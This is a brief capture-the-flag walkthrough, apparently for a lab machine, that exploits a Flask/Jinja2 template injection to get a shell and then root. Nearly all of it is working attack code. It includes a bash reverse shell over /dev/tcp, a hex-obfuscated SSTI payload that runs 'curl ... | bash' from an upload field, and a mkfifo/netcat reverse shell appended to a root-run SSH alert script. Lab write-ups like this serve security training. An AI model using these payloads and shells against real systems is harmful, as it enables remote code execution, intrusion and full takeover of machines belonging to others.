# Initial

Set the URL and IP in /etc/hosts

# Reference

[This link](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/)

Without refering to the above I would not be able to get reverse shell to the machine

# Reverse Shell

#!/bin/bash
bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"

then host the file with `python3 -m http.server 80`

# Payload

put the below into an image file and upload to the website
`{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.10.14.243/revshell | bash")|attr("read")()}}`

# Privilege Escalation

Make use of the `ssh-alert.sh` script in /usr/local/sbin by appending this `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.243 4445 >/tmp/f` 

Then SSH to svc_acc to trigger the script and get root
